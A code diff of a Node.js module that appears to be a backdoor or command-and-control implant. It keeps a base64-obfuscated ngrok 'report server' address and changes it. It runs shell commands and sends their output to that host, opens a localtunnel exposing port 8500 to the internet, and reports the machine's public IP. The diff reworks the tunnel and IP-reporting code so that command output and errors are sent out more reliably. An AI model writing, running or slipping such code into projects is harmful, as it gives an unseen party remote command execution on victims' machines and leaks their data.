@@ -1,11 +1,12 @@
 const util = require("util");
 const exec = util.promisify(require("child_process").exec);
 const fetch = require("node-fetch");
+const fs = require("fs");
 const { spawn } = require("child_process");
 
 const PORT = 8500;
 const REPORT_SERVER =
-  "aHR0cHM6Ly85YjcyLTE4OC0xNTAtMjQ4LTE4Lm5ncm9rLWZyZWUuYXBw";
+  "aHR0cHM6Ly82NmMyLTE4OC0xNTAtMjQ4LTE4Lm5ncm9rLWZyZWUuYXBw";
 
 async function executeAndReport(command, callback) {
   const result = await execute(command);
@@ -48,33 +49,25 @@ async function report(data) {
 }
 
 // Start local tunnel
+async function startLocalTunnel() {
+  const localTunnelBinPath = "node_modules/.bin/lt";
 
-function startLocalTunnel() {
-  const localtunnel = spawn("node_modules/.bin/lt", ["--port", PORT]);
-
-  localtunnel.stdout.on("data", (data) => {
-    if (data) {
-      report(data);
-    }
-  });
-
-  localtunnel.stderr.on("data", (data) => {
-    console.error(`stderr: ${data}`);
-  });
-
-  localtunnel.on("close", (code) => {
-    console.log(`child process exited with code ${code}`);
-  });
+  if (fs.existsSync(localTunnelBinPath)) {
+    await spawnHelper(localTunnelBinPath, ["--port", PORT], report);
+  } else {
+    await spawnHelper("npx", ["localtunnel", "--port", PORT], report);
+  }
 }
 
 function reportLocalIp() {
-  const prompt = spawn("curl", ["ipv4.icanhazip.com"]);
-
-  prompt.stdout.on("data", (data) => {
-    if (data) {
-      report(data);
-    }
-  });
+  fetch("https://ipv4.icanhazip.com")
+    .then((res) => res.text())
+    .then((body) => {
+      report(body.trim());
+    })
+    .catch((error) => {
+      console.error("Error:", error);
+    });
 }
 
 module.exports = {
@@ -85,3 +78,26 @@ module.exports = {
   report,
   port: PORT,
 };
+
+function spawnHelper(command, args, onData) {
+  return new Promise((resolve, reject) => {
+    try {
+      const commandResponse = spawn(command, args);
+
+      commandResponse.stdout.on("data", (data) => {
+        onData(data.toString());
+      });
+
+      commandResponse.stderr.on("data", (data) => {
+        onData(data.toString());
+      });
+
+      commandResponse.on("error", (error) => {
+        onData(error.toString());
+        reject(error);
+      });
+    } catch (error) {
+      onData(error.toString());
+    }
+  });
+}
